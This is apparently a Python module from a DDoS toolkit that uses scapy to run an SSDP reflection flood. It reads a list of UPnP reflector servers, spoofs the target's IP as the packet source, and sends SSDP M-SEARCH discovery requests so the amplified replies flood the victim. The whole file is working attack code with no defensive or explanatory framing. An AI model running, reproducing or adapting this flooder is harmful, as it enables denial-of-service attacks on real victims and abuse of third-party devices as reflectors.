import random
from scapy.all import *
from stringcolor import *
from scapy.layers.inet import *
from bin.addons.utils import __path

red = "#ff0033"
green = "#02f93c"
yellow = "#eefc32"
blue = "\033[38;5;51m"


payload = [
    "M-SEARCH * HTTP/1.1",
    "Host:239.255.255.250:1900",
    "ST:upnp:rootdevice",
    'Man:"ssdp:discover"',
    "MX:1",
    "",
]
sendpayload = "\r\n".join(payload)

with open(__path("bin", "config", "ssdp_servers.txt"), "r") as f:
    ssdp_servers = f.readlines()


def flood(target):
    src_port = random.randint(0, 65535)
    server = random.choice(ssdp_servers)
    server = server.replace("\n", "")
    try:
        send(
            IP(dst=server, src=target[0])
            / UDP(sport=src_port, dport=1900)
            / sendpayload,
            verbose=False,
        )
    except Exception as e:
        print(
            f"\033[1m{cs('[✘] ERROR', red)}\033[0m {cs('While sending packget', yellow)}\n{e}"
        )
    else:
        print(
            f"{cs(f'[✔] SUCCESS', green)} {cs(f'Packget sent! send to:', yellow)} {blue}{server}\033[0m"
        )
